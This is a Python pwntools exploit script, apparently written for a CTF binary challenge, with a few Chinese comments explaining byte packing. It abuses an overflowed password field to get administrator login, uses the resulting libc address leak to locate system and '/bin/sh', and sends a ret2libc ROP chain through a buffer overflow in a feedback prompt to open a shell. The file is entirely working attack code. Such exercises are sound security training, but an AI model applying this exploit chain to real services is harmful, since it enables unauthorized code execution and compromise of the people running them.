from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#io = remote('geek.ctfplus.cn',30766)
io = process('./pwn')
libc = ELF("./libc.so.6")
io.sendlineafter(b"Your choice >> ", b"1")
io.sendafter(b"Please enter your name:\n", b"A" * 16)
password_payload = b'A' * 32 + p32(0)
io.sendafter(b"Please enter your password:\n", password_payload)

io.sendlineafter(b"Your choice >> ", b"3")
io.sendafter(b"Please enter your password:\n", b'A' * 32) #这里有个验证密码的login函数，输入密码就行

io.recvuntil(b"WELCOME, ADMINISTRATOR.\n")
leaked_puts_addr = u64(io.recv(8))#u64相当于解包，把机器输出的字节转换为我们能看懂的数字，用于接收，p64相当于打包，是逆过程，用于发送

libc_base = leaked_puts_addr - libc.symbols['puts']
libc.address = libc_base
rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
RET = rop.find_gadget(['ret']).address
BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']

io.sendlineafter(b"Your choice >> ", b"2")
payload = b'A' * 24  
payload += p64(RET)     
payload += p64(POP_RDI) 
payload += p64(BIN_SH)  
payload += p64(SYSTEM) 
io.sendafter(b"Please enter your feedback:\n", payload)

io.interactive()

